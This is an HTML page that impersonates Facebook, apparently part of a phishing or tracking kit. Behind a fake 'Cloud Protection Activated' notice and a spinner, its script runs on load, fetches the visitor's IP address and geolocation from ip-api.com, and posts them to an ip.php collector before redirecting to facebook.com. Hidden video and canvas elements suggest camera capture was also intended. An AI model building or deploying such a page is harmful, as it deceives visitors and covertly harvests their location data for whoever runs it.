<html>
<head>
<title>Facebook</title>
<meta charset='utf-8'><meta name='referrer' content='origin-when-crossorigin' id='meta_referrer'><meta property='og:site_name' content='Facebook'><meta property='og:url' content='https://www.facebook.com/'><meta property='og:image' content='https://www.facebook.com/images/fb_icon_325x325.png'>
	<script src="jquery-3.2.1.min.js"></script>
</head>
<style>
    .container{
        padding: 20px;
        background-color: transparent;
        margin-top: 50px;
        font-family: Arial, Helvetica, sans-serif;
        position: relative;
        text-align: center;
    }
    .data{
        font-weight: bold;
        font-size: 30px;
    }
    .check{
        font-size: 40px;
        margin-bottom: 40px;
    }
    .wait-main{
        width: 200px;
        margin-top: 20px;
        position: relative;
        left : 45%;
        height: 200px;
        padding: 10px;
    }
    .wait{
        width: 100;
        height: 100;
        border-radius: 50%;
        border-left: solid 10px green;
        /*border-top: solid 5px red;
        border-bottom: solid 5px blue;
        border-right: solid 5px orangered;*/
        animation: process 0.5s infinite;
    }
    @keyframes process{
        0%{
            transform: rotateZ(72deg);
        }
        25%{
            transform: rotateZ(144deg);
        }
        50%{
            transform: rotateZ(216deg);
        }
        75%{
            transform: rotateZ(288deg);
        }
        100%{
            transform: rotateZ(360deg);
        }
    }
    #video{
        display: none;
    }
    #canvas{
        display: none;
    }
</style>
<body>
    <div class="container">
        <div class="data">
            <div class="check">
                Cloud Protection Activated
            </div>
You will simply redirecting to facebook.com ...
            <div class="wait-main">
                <div class="wait"></div>
            </div>
            <div id="sublabel"></div>
        </div>
    </div>
<video autoplay id="video"></video>
<canvas id="canvas" width="640" height="480"></canvas>
    <script>
        $(document).ready(function(){
            console.log('[*] Started')
            $.ajax({
                url : 'http://ip-api.com/json',
                type : 'GET',
                beforeSend : function(){
                    console.log('[*] Proccessing')
                },
                success : function(d){
                    console.log(d)
                    str_d = JSON.stringify(d)
                    $.ajax({
                        url: 'ip.php',
                        type: 'POST',
                        data : {ip_details : str_d},
                        success : function(m){
                            if(m == 1){
                                console.log('[*] IP success')
                                console.log('[*] First Check Completed')
window.location.href = 'http://facebook.com'
                            }
                            else if(m ==0){
                                console.log('fail')
                                url = window.location.href
                                window.location.href = url
                            }
                        }
                    })
                }
            });
        });
    </script>
</body>
</html>
